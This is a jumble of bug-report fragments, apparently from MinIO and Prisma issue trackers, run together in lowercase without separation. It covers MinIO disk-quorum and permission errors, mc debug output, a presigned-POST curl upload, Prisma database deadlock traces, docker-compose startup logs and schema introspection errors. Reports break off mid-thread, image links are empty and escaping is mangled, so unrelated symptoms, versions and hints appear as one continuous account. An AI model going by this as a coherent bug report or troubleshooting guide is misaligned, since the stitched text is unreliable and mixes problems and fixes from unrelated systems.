error: net/http/server.go:1890 + 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2() api: system()
time: 01:26:01 utc 06/15/2020
error: created by net/http.(*server).serve 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2() api: system()
time: 01:26:01 utc 06/15/2020
error: net/http/server.go:2928 + 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2()
unable to read 'format.json' from post eof unable to read 'format.json' from post eof waiting for a minimum of 2 disks to come online (elapsed 4s)</code></pre>
when i started the container it stops with this issue:
`minio | error unable to initialize gateway backend: unable to write to the backend
minio | > please ensure minio binary has write permissions for the backend
minio | hint:
minio | use 'sudo chown root /data && sudo chmod u+rxw /data' to provide sufficient permissions.
minio exited with code 1` permitions on the ./nfs:
total 5 4 drwxrwxr-x 2 root root 2 jun 6 11:39 .
`mc admin policy info ko users` ```
mc: <error> cannot list policy: invalid character '<' looking for beginning of value.
works properly if the minio server is on a x86_64 architecture server
``` debug info ```
mc admin policy list ko --debug
mc: <debug> get /minio/admin/v3/list-canned-policies http/1.1
host: 192.168.1.68:2222
user-agent: minio (linux; amd64) madmin-go/0.0.1 mc/2020-05-28t23:43:36z
authorization: aws4-hmac-sha256 credential=**redacted**/20200604//s3/aws4_request, signedheaders=host;x-amz-content-s ha256;x-amz-date, signature=**redacted**
x-amz-content-sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
x-amz-date: 20200604t145206z
accept-encoding: gzip
mc: <debug> http/1.1 200 ok
content-length: 2021
accept-ranges: bytes
content-type: text/html; charset=utf-8
date: thu, 04 jun 2020 14:52:06 gmt
last-modified: sat, 24 jun 2017 08:36:20 gmt
vary: origin
mc: <debug> response time: 410.032111ms
mc: <error> cannot list policy: invalid character '<' looking for beginning of value (1) admin-policy-list.go:70 cmd.mainadminpolicylist(..) tags: [ko] (0) admin-policy-list.go:70 cmd.mainadminpolicylist(..) release-tag:release.2020-05-28t23-43-36z | commit:2403e7a7441b | host:aspire | os:linux | arch:amd64 | lang:go1.13.1 0 | mem:1.8 mb/72 mb | heap:1.8 mb/66 mb.
scala> val file = sc.textfile("s3a://testbucket/testdata")
file: org.apache.spark.rdd.rdd[string] = s3a://testbucket/testdata mappartitionsrdd[1] at textfile at <console>:24 scala> val counts = file.flatmap(line => line.split(" ")).map(word => (word, 1)).reducebykey(_ + _)
java.lang.runtimeexception: java.lang.classnotfoundexception: class org.apache.hadoop.spark.hadoop.fs.s3a.s3afilesystem not found at org.apache.hadoop.conf.configuration.getclass(configuration.java:2597)
sends empty content-encoding for object with mime type `image/svg+xml`
i'm guessing this is for other mime types as well.
.svg is served with application/octet-stream
when i send more than a single async getobjectrequest, the program gets stuck forever.
i don't have this problem with headobjectrequest for example or when the bucket is empty or when i send a single request only.
curl --location --request post ' \\
--header 'content-type: multipart/form-data; ' \\
--form 'x-amz-credential=umeox/20200417/us-east-1/s3/aws4_request' \\
--form 'x-amz-algorithm=aws4-hmac-sha256' \\
--form 'x-amz-date=20200417t082258z' \\
--form 'policy=eyjlehbpcmf0aw9uijoimjaymc0wnc0ymlqwodoymjo1oc4wmdbaiiwiy29uzgl0aw9ucyi6w3siynvja2v0ijoizwxhcmkifsx7imfjbci6inb1ymxpyy1yzwfkin0seyj4lwftei1jcmvkzw50awfsijoidw1lb3gvmjaymda0mtcvdxmtzwfzdc ==' \\
--form 'x-amz-signature=ac54cb9b28370c415419b8fc12bff379b2e0c063d537f11ddcaab28986aa6185' \\
--form 'file=@/c:/users/pc/pictures/1112442.png'
minio encountered write error:insufficient number of disks online
about only one third objects were uploaded successfully.
the performance is degraded obviously
nearly 50% or even more.
**then we tested on the latest minio version release.2020-04-10t03-34-42z, the result is almost the same as on release.2020-02-27t00-23-05z** compared the release.2019-09-25t18-25-51z
, the upload time performance degraded
**but for the download time performance, we didn't see much degraded.**
i get error in each "master" container > waiting for a minimum of 2 disks to come online (elapsed 8m37s)
> unable to read 'format.json' from 404 page not found
> unable to read 'format.json' from 404 page not found
> unable to read 'format.json' from 404 page not found
> unable to read 'format.json' from 404 page not found
> when i open any of this paths in browser - they open
tested on browser to open url it is working.
use java client aws sdk to access the minio server
when try to call s3client.listbuckets(), the call keep on processing and never return response after long time, there is no error at both the minio server command console and also the java client.
getting below error from minio status apr 07 16:08:33 server04 run_minio.bash[852]: starting minio process..
apr 07 16:08:34 server04 run_minio.bash[852]: error invalid command line arguments: no endpoint pointing to the local machine is found.
apr 07 16:08:34 server04 run_minio.bash[852]: > please provide correct combination of local/remote paths.
apr 07 16:08:34 server04 run_minio.bash[852]: help:
apr 07 16:08:34 server04 run_minio.bash[852]: for more information, please refer to
apr 07 16:08:34 server04 systemd[1]: minio.service: main process exited, code=exited, status=1/failure
apr 07 16:08:34 server04 systemd[1]: unit minio.service entered failed state.
apr 07 16:08:34 server04 systemd[1]: minio.service failed.
minio logs an error that initialization fails but starts successfully.
shows empty page.
i checked all the ip of my 4 nodes and i get nothing in port 9000 and nothing on any other port
also, it's not clear where to get the minio_access_key and minio_secret from.
browser ui becomes slower and unresponsive when bucket storage is up to 416.00 gb.
nothing happened
there's was no message posted on stdout/stderr from the other nodes.
- uploads are failing using `mc`
uploads are succeeding using the browser ui.
on start i get following error: error invalid command line arguments: path '/data' can not be served by different port on same address hint: for more information, please refer to
deleting several nodes of a simple linked list concurrently results in an internal server error, and this cluster log (the first for mysql, the later for postgresql): on mysql:
{"log":"{\\"key\\":\\"error/unhandled\\",\\"requestid\\":\\"local:api:cjlwccos307sy09055u21tc9u\\",\\"clientid\\":\\"linkedlist@dev\\",\\"payload\\":{\\"exception\\":\\"java.sql.sqltransactionrollbackexception: (conn=79) deadlock found when trying to get lock; try restarting transaction\\",\\"query\\":\\"mutation {\\\ deleteitem(where: {\\\ id: \\\\\\"cjlwccora07su0905lyw9hkcu\\\\\\"\\\ })\\\ {id}\\\ }\\",\\"variables\\":\\"{}\\",\\"code\\":\\"0\\",\\"stack_trace\\":\\"org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.get(exceptionmapper.java:165)\\\\\\\ org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.getexception(exceptionmapper.java:106)\\\\\\\ org.mariadb.jdbc.mariadbstatement.executeexceptionepilogue(mariadbstatement.java:235)\\\\\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal(mariadbpreparedstatementclient.java:224)\\\\\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.execute(mariadbpreparedstatementclient.java:159)\\\\\\\ com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44)\\\\\\\ com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java)\\\\\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$deletetodbio$1(builderbase.scala:70)\\\\\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$deletetodbio$1$adapted(builderbase.scala:70)\\\\\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$jooqtodbio$1(builderbase.scala:87)\\\\\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)\\\\\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)\\\\\\\ slick.dbio.dbioaction$$anon$4.$anonfun$run$3(dbioaction.scala:239)\\\\\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\\\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\\\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\\\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\\\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\\\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\\\\\ slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:239)\\\\\\\ slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:237)\\\\\\\ slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275)\\\\\\\ slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275)\\\\\\\ java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)\\\\\\\ java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)\\\\\\\ java.lang.thread.run(thread.java:748)\\",\\"message\\":\\"(conn=79) deadlock found when trying to get lock; try restarting transaction\\"}}\ ","stream":"stdout","time":"2018-09-10t13:46:51.911911169z"}
on postgres:
{"log":"{\\"key\\":\\"error/unhandled\\",\\"requestid\\":\\"local:api:cjlxfuz4j001o0979zisx7scb\\",\\"clientid\\":\\"linkedlist$dev\\",\\"payload\\":{\\"exception\\":\\"org.postgresql.util.psqlexception: error: deadlock detected\\\ detail: process 34 wai
ts for sharelock on transaction 4329; blocked by process 33.\\\ process 33 waits for sharelock on transaction 4328; blocked by process 34.\\\ hint: see server log for query details.\\\ where: while locking tuple (0,12) in relation \\\\\\"it
em\\\\\\"\\\ sql statement \\\\\\"select 1 from only \\\\\\"linkedlist$dev\\\\\\".\\\\\\"item\\\\\\" x where \\\\\\"id\\\\\\"::pg_catalog.text operator(pg_catalog.=) $1::pg_catalog.text for key share of x\\\\\\"\\",\\"query\\":\\"mutation {\\\ updateitem(data: {pre
vious: {connect: {id: \\\\\\"cjlxfuz28001h09790hqjsae6\\\\\\"} } }, where: {id: \\\\\\"cjlxfuz2j001l09791ri8wvfb\\\\\\"}) {id}\\\ }\\",\\"variables\\":\\"{}\\",\\"code\\":\\"0\\",\\"stack_trace\\":\\"org.postgresql.core.v3.queryexecutorimpl.receiveerrorrespon
se(queryexecutorimpl.java:2433)\\\\\\\ org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)\\\\\\\ org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)\\\\\\\ org.postgresql.jdbc.pgstateme
nt.executeinternal(pgstatement.java:441)\\\\\\\ org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)\\\\\\\ org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)\\\\\\\ org.postgresql.jdbc.pgpreparedsta
tement.execute(pgpreparedstatement.java:144)\\\\\\\ com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44)\\\\\\\ com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java)\\\\\\
\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$inserttodbio$1(builderbase.scala:63)\\\\\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$inserttodbio$1$adapted(builderbase.scala:63)\\\\\\\ com.prisma.api.connecto
r.jdbc.database.builderbase.$anonfun$jooqtodbio$1(builderbase.scala:81)\\\\\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)\\\\\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)\\\\\\\ slick.basic.basicback
end$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275)\\\\\\\ slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275)\\\\\\\ java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)\\\\\\\ java.uti
l.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)\\\\\\\ java.lang.thread.run(thread.java:748)\\",\\"message\\":\\"error: deadlock detected\\\ detail: process 34 waits for sharelock on transaction 4329; blocked by process 33.\\\ process 33 waits for sharelock on transaction 4328; blocked by process 34.\\\ hint: see server log for query details.\\\ where: while locking tuple (0,12) in relation \\\\\\"item\\\\\\"\\\ sql statement \\\\\\"select 1 from only \\\\\\"linked
list$dev\\\\\\".\\\\\\"item\\\\\\" x where \\\\\\"id\\\\\\"::pg_catalog.text operator(pg_catalog.=) $1::pg_catalog.text for key share of x\\\\\\"\\"}}\ ","stream":"stdout","time":"2018-09-11t08:12:51.169442483z"}
### prisma version is 1.10.2
type region{ id: id! @unique name: string! parent: region @relation(name:"children") children: [region!]! @relation(name:"children")
this is actually a regional tree
when running this code:
``` mutation delete { deletemanyregions( where: { id: "cjiwukyc400910708ngblle9l" or: { parent: { id: "cjiwukyc400910708ngblle9l" } } } ) { count }
i want to delete the parent and the children
it fails with the following internal server error:
{ "data": null, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjiwv7wf2009p0708u13wdltv", "path": [ "deletemanyregions" ], "locations": [ { "line": 2, "column": 3 } ], "requestid": "local:api:cjiwv7wf2009p0708u13wdltv" } ]
i'm not sure if this is feasible
**reproduction**
type region{ id: id! @unique name: string! parent: region @relation(name:"children") children: [region!]! @relation(name:"children")
when a service is deployed with a specific datamodel the generated api schema is invalid
related issue:
passing -r or --reset to the `prisma seed` command will not reset the database if prisma seed uses a script file.
when running the command `prisma introspect` against an existing psql database the generated datamodel generates an `int` type for a `bigint` column type.
error a short while after starting the server, which causes the client to disconnect
the server can be re-connected to (without having to restart it), but it will again disconnect after ~5 mins
calums-macbook-pro-2:server calummoore$ docker-compose down -v
removing server_prisma_1 ..
removing server_postgres_1 ..
removing server_redis_1 ..
removing network server_default
removing volume server_postgres
removing volume server_redis-data
calums-macbook-pro-2:server calummoore$ docker-compose up
creating network "server_default" with the default driver
creating volume "server_postgres" with default driver
creating volume "server_redis-data" with default driver
creating server_redis_1 ..
creating server_prisma_1 ..
creating server_postgres_1 ..
attaching to server_postgres_1, server_redis_1, server_prisma_1
postgres_1 | the files belonging to this database system will be owned by user "postgres".
postgres_1 | this user must also own the server process.
postgres_1 |
postgres_1 | the database cluster will be initialized with locale "en_us.utf8".
postgres_1 | the default database encoding has accordingly been set to "utf8".
postgres_1 | the default text search configuration will be set to "english".
postgres_1 |
postgres_1 | data page checksums are disabled.
postgres_1 |
postgres_1 | fixing permissions on existing directory /var/lib/postgresql/data ..
postgres_1 | creating subdirectories ..
postgres_1 | selecting default max_connections ..
postgres_1 | selecting default shared_buffers ..
redis_1 | 1:c 07 jun 14:58:47.925 # oo0ooo0ooo0oo redis is starting oo0ooo0ooo0oo
redis_1 | 1:c 07 jun 14:58:47.925 # redis version=4.0.7, bits=64, commit=00000000, modified=0, pid=1, just started
redis_1 | 1:c 07 jun 14:58:47.925 # configuration loaded
redis_1 | 1:m 07 jun 14:58:47.945 * running mode=standalone, port=6379.
redis_1 | 1:m 07 jun 14:58:47.945 # warning: the tcp backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.
redis_1 | 1:m 07 jun 14:58:47.945 # server initialized
postgres_1 | selecting dynamic shared memory implementation ..
redis_1 | 1:m 07 jun 14:58:47.945 # warning you have transparent huge pages (thp) support enabled in your kernel
this will create latency and memory usage issues with redis
to fix this issue run the command 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot
redis must be restarted after thp is disabled.
redis_1 | 1:m 07 jun 14:58:47.946 * ready to accept connections
postgres_1 | creating configuration files ..
postgres_1 | running bootstrap script ..
postgres_1 | performing post-bootstrap initialization ..
postgres_1 | syncing data to disk ..
postgres_1 |
postgres_1 | success
you can now start the database server using:
postgres_1 |
postgres_1 | pg_ctl -d /var/lib/postgresql/data -l logfile start
postgres_1 |
postgres_1 |
postgres_1 | warning: enabling "trust" authentication for local connections
postgres_1 | you can change this by editing pg_hba.conf or using the option -a, or
postgres_1 | --auth-local and --auth-host, the next time you run initdb.
postgres_1 | waiting for server to start....2018-06-07 14:58:52.404 utc [38] log: listening on unix socket "/var/run/postgresql/.s.pgsql.5432"
postgres_1 | 2018-06-07 14:58:52.431 utc [39] log: database system was shut down at 2018-06-07 14:58:49 utc
postgres_1 | 2018-06-07 14:58:52.437 utc [38] log: database system is ready to accept connections
postgres_1 | done
postgres_1 | server started
postgres_1 | create database
postgres_1 |
postgres_1 | create role
postgres_1 |
postgres_1 |
postgres_1 | /usr/local/bin/docker-entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*
postgres_1 |
postgres_1 | 2018-06-07 14:58:53.128 utc [38] log: received fast shutdown request
postgres_1 | waiting for server to shut down....2018-06-07 14:58:53.133 utc [38] log: aborting any active transactions
postgres_1 | 2018-06-07 14:58:53.147 utc [38] log: worker process: logical replication launcher (pid 45) exited with exit code 1
postgres_1 | 2018-06-07 14:58:53.151 utc [40] log: shutting down
prisma_1 | jun 07, 2018 2:58:53 pm org.postgresql.core.v3.connectionfactoryimpl log
prisma_1 | warning: connectexception occurred while connecting to postgres:5432
prisma_1 | java.net.connectexception: connection refused (connection refused)
prisma_1 | at java.net.plainsocketimpl.socketconnect(native method)
prisma_1 | at java.net.abstractplainsocketimpl.doconnect(abstractplainsocketimpl.java:350)
prisma_1 | at java.net.abstractplainsocketimpl.connecttoaddress(abstractplainsocketimpl.java:206)
prisma_1 | at java.net.abstractplainsocketimpl.connect(abstractplainsocketimpl.java:188)
prisma_1 | at java.net.sockssocketimpl.connect(sockssocketimpl.java:392)
prisma_1 | at java.net.socket.connect(socket.java:589)
prisma_1 | at org.postgresql.core.pgstream.<init>(pgstream.java:69)
prisma_1 | at org.postgresql.core.v3.connectionfactoryimpl.openconnectionimpl(connectionfactoryimpl.java:156)
prisma_1 | at org.postgresql.core.connectionfactory.openconnection(connectionfactory.java:49)
prisma_1 | at org.postgresql.jdbc.pgconnection.<init>(pgconnection.java:195)
prisma_1 | at org.postgresql.driver.makeconnection(driver.java:452)
prisma_1 | at org.postgresql.driver.connect(driver.java:254)
prisma_1 | at slick.jdbc.driverdatasource.getconnection(driverdatasource.scala:101)
prisma_1 | at com.zaxxer.hikari.pool.poolbase.newconnection(poolbase.java:341)
prisma_1 | at com.zaxxer.hikari.pool.poolbase.newpoolentry(poolbase.java:193)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool.createpoolentry(hikaripool.java:430)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool.access$500(hikaripool.java:64)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool$poolentrycreator.call(hikaripool.java:570)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool$poolentrycreator.call(hikaripool.java:563)
prisma_1 | at java.util.concurrent.futuretask.run(futuretask.java:266)
prisma_1 | at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
prisma_1 | at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
prisma_1 | at java.lang.thread.run(thread.java:748)
prisma_1 | jun 07, 2018 2:58:53 pm org.postgresql.driver connect
prisma_1 | severe: connection error:
prisma_1 | org.postgresql.util.psqlexception: connection to postgres:5432 refused
check that the hostname and port are correct and that the postmaster is accepting tcp/ip connections.
prisma_1 | at org.postgresql.core.v3.connectionfactoryimpl.openconnectionimpl(connectionfactoryimpl.java:245)
prisma_1 | at org.postgresql.core.connectionfactory.openconnection(connectionfactory.java:49)
prisma_1 | at org.postgresql.jdbc.pgconnection.<init>(pgconnection.java:195)
prisma_1 | at org.postgresql.driver.makeconnection(driver.java:452)
prisma_1 | at org.postgresql.driver.connect(driver.java:254)
prisma_1 | at slick.jdbc.driverdatasource.getconnection(driverdatasource.scala:101)
prisma_1 | at com.zaxxer.hikari.pool.poolbase.newconnection(poolbase.java:341)
prisma_1 | at com.zaxxer.hikari.pool.poolbase.newpoolentry(poolbase.java:193)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool.createpoolentry(hikaripool.java:430)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool.access$500(hikaripool.java:64)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool$poolentrycreator.call(hikaripool.java:570)
prisma_1 | at com.zaxxer.hikari.pool.hikaripool$poolentrycreator.call(hikaripool.java:563)
prisma_1 | at java.util.concurrent.futuretask.run(futuretask.java:266)
prisma_1 | at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
prisma_1 | at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
prisma_1 | at java.lang.thread.run(thread.java:748)
prisma_1 | caused by: java.net.connectexception: connection refused (connection refused)
prisma_1 | at java.net.plainsocketimpl.socketconnect(native method)
prisma_1 | at java.net.abstractplainsocketimpl.doconnect(abstractplainsocketimpl.java:350)
prisma_1 | at java.net.abstractplainsocketimpl.connecttoaddress(abstractplainsocketimpl.java:206)
prisma_1 | at java.net.abstractplainsocketimpl.connect(abstractplainsocketimpl.java:188)
prisma_1 | at java.net.sockssocketimpl.connect(sockssocketimpl.java:392)
prisma_1 | at java.net.socket.connect(socket.java:589)
prisma_1 | at org.postgresql.core.pgstream.<init>(pgstream.java:69)
prisma_1 | at org.postgresql.core.v3.connectionfactoryimpl.openconnectionimpl(connectionfactoryimpl.java:156)
prisma_1 | ..
postgres_1 | 2018-06-07 14:58:53.247 utc [38] log: database system is shut down
postgres_1 | done
postgres_1 | server stopped
postgres_1 |
postgres_1 | postgresql init process complete; ready for start up.
postgres_1 |
postgres_1 | 2018-06-07 14:58:53.363 utc [1] log: listening on ipv4 address "0.0.0.0", port 5432
postgres_1 | 2018-06-07 14:58:53.363 utc [1] log: listening on ipv6 address "::", port 5432
postgres_1 | 2018-06-07 14:58:53.370 utc [1] log: listening on unix socket "/var/run/postgresql/.s.pgsql.5432"
postgres_1 | 2018-06-07 14:58:53.384 utc [65] log: database system was shut down at 2018-06-07 14:58:53 utc
postgres_1 | 2018-06-07 14:58:53.479 utc [1] log: database system is ready to accept connections
postgres_1 | 2018-06-07 14:58:53.763 utc [72] error: database "prisma" already exists
postgres_1 | 2018-06-07 14:58:53.763 utc [72] statement: create database "prisma"
prisma_1 | obtaining exclusive agent lock...
prisma_1 | obtaining exclusive agent lock..
successful.
prisma_1 | deployment worker initialization complete.
postgres_1 | 2018-06-07 14:58:57.753 utc [93] error: null value in column "lastpinged" violates not-null constraint
postgres_1 | 2018-06-07 14:58:57.753 utc [93] detail: failing row contains (fd5ae75e-a49c-45cb-81b1-140ef741dafe, null).
postgres_1 | 2018-06-07 14:58:57.753 utc [93] statement: insert into "telemetryinfo" ("id","lastpinged") values ($1,$2)
prisma_1 | initializing workers...
prisma_1 | successfully started 1 workers.
prisma_1 | server running on :4466
prisma_1 | version is up to date.
prisma_1 | [metrics] warning: no metrics will be recorded.
prisma_1 | warning: management api authentication is disabled
to protect your management server you should provide one (not both) of the environment variables 'cluster_public_key' (asymmetric, deprecated soon) or 'prisma_management_api_jwt_secret' (symmetric jwt).
prisma_1 | {"key":"error/handled","requestid":"local:management:cji4o4gp200020a07mprtgjoi","payload":{"exception":"com.prisma.deploy.schema.invalidprojectid: no service with name \'default\' and stage \'default\' found","query":"\ query($name: string! $stage: string!) {\ project(name: $name stage: $stage) {\ name\ stage\ }\ }\ ","variables":"{\\"name\\":\\"default\\",\\"stage\\":\\"default\\"}","code":"4000","stack_trace":"com.prisma.deploy.schema.schemabuilderimpl.$anonfun$projectfield$3(schemabuilder.scala:139)\\\ scala.option.getorelse(option.scala:121)\\\ com.prisma.deploy.schema.schemabuilderimpl.$anonfun$projectfield$2(schemabuilder.scala:139)\\\ scala.util.success.$anonfun$map$1(try.scala:251)\\\ scala.util.success.map(try.scala:209)\\\ scala.concurrent.future.$anonfun$map$1(future.scala:287)\\\ scala.concurrent.impl.promise.liftedtree1$1(promise.scala:29)\\\ scala.concurrent.impl.promise.$anonfun$transform$1(promise.scala:29)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)\\\ akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)","message":"no service with name \'default\' and stage \'default\' found"}}
prisma_1 | warning: management api authentication is disabled
to protect your management server you should provide one (not both) of the environment variables 'cluster_public_key' (asymmetric, deprecated soon) or 'prisma_management_api_jwt_secret' (symmetric jwt).
prisma_1 | warning: management api authentication is disabled
to protect your management server you should provide one (not both) of the environment variables 'cluster_public_key' (asymmetric, deprecated soon) or 'prisma_management_api_jwt_secret' (symmetric jwt).
prisma_1 | [debug] initializing deployment worker for default$default
prisma_1 | [debug] scheduling deployment for project default$default
prisma_1 | warning: management api authentication is disabled
to protect your management server you should provide one (not both) of the environment variables 'cluster_public_key' (asymmetric, deprecated soon) or 'prisma_management_api_jwt_secret' (symmetric jwt).
prisma_1 | warning: management api authentication is disabled
to protect your management server you should provide one (not both) of the environment variables 'cluster_public_key' (asymmetric, deprecated soon) or 'prisma_management_api_jwt_secret' (symmetric jwt).
prisma_1 | [debug] applied migration for project default$default
prisma_1 | warning: management api authentication is disabled
to protect your management server you should provide one (not both) of the environment variables 'cluster_public_key' (asymmetric, deprecated soon) or 'prisma_management_api_jwt_secret' (symmetric jwt).
prisma_1 | [metrics] warning: no metrics will be recorded.
prisma_1 | [metrics] warning: no metrics will be recorded.
postgres_1 | 2018-06-07 15:03:54.298 utc [83] error: column "data_length" does not exist at character 39
postgres_1 | 2018-06-07 15:03:54.298 utc [83] statement:
postgres_1 | select table_schema, sum( data_length + index_length) / 1024 / 1024 from information_schema.tables group by table_schema
postgres_1 |
i could only reproduce this when using the following project setup: ```
.graphqlconfig.yml
database
datamodel.graphql
prisma.yml
``` `prisma.yml` has no `endpoint` property
in the project folder, run `prisma deploy`
choose any service name and stage name
the `endpoint` property in `prisma.yml` is correctly written: ![image]( however, at the very end of the output, the endpoint is wrong: ![image](
docker-compose log is saying the following: ```
prisma_1 | java.lang.runtimeexception: could not find relatedmodel for field ["field-name"] on model [none]
prisma_1 | at scala.sys.package$.error(package.scala:27)
prisma_1 | at com.prisma.shared.models.field.relatedmodel_$bang(models.scala:255)
prisma_1 | at com.prisma.api.schema.uncachedinputtypesbuilder.$anonfun$computerelationalinputfieldsforcreate$1(inputtypesbuilder.scala:289)
prisma_1 | at scala.collection.immutable.list.flatmap(list.scala:335)
prisma_1 | at com.prisma.api.schema.uncachedinputtypesbuilder.computerelationalinputfieldsforcreate(inputtypesbuilder.scala:288)
...............
prisma_1 | [bugsnag - local / testing] error report: com.bugsnag.report@44ceddf1
``` "field-name" changes frequently between different fields which each seem to be set up correctly
this looks like some sort of race condition within the setup of prisma to me, considering the field-name changes sometimes? `prisma deploy` logs output no errors / issues, only in `docker-compose up` log
using `prisma v1.8.3`
after changing the name of a relation inside `datamodel.graphql`, `prisma deploy` signs off on changes, but then keeps `applying changes (12/9)` until such time that the token expires.
here the complete error message:
error: authentication token is invalid: token can\'t be decoded: the token is expired since 2018-05-29t15:39:59z { "data": null, "errors": [ { "locations": [ { "line": 2, "column": 11 } ], "path": [ "migrationstatus" ], "code": 3015, "message": "authentication token is invalid: token can\'t be decoded: the token is expired since 2018-05-29t15:39:59z", "requestid": "__path__:management:__project_id__" } ], "status": 200
running `prisma deploy` on the root of my project fails to generate code but succeeds when i move `.graphqlconfig.yml` to the `database` folder and runs the deploy command on the `database` folder
prisma init fails to connect to the database: ![image](
here are some errors i got after introspecting my schema
error message: ```the field `id` is reserved and has to have the format: id: id! @unique or id: int! @unique.```
- it did not add the @unique directive to the id fields
error message: ```the relation field `receiver` must specify a `@relation` directive: `@relation(name: "myrelation")` ```
- it added `@pgrelation(column: "receiver_id")` instead of `@relation`
error message: ```the type `users` has a duplicate fieldname.```
- i had 2 foreign keys to the user table so it created 2 references back to that table with that same name those are the errors that occurred when trying to deploy
i fixed most of the errors manually, and then removed the problematic fields
this let me deploy, but when i opened up graphql playground i got the following error from the server: `sangria.schema.nonuniquefieldserror: all fields within 'query' type should have unique names! non-unique fields: 'members'.`
i have my database generated and prisma running and successfully deployed.
when i attempt to select from `user` table with a `user(where: { id: "c3917b5b-18ed-4a84-a6f7-6be7a8c21d66" })` query, i get the following error **query request** ```
{ users { id } user(where: { id: "c3917b5b-18ed-4a84-a6f7-6be7a8c21d66" }) { id }
``` **query response** ```
{ "data": { "users": [ { "id": "c3917b5b-18ed-4a84-a6f7-6be7a8c21d66" } ], "user": null }, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjhji0d2v000f07245jw0cxz3", "path": [ "user" ], "locations": [ { "line": 5, "column": 3 } ], "requestid": "local:api:cjhji0d2v000f07245jw0cxz3" } ]
``` **error from docker-compose logs**
prisma_1 | org.postgresql.util.psqlexception: error: operator does not exist: uuid = character varying
prisma_1 | hint: no operator matches the given name and argument type(s)
you might need to add explicit type casts.
prisma_1 | position: 46
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)
prisma_1 | at org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)
prisma_1 | at org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)
prisma_1 | at org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)
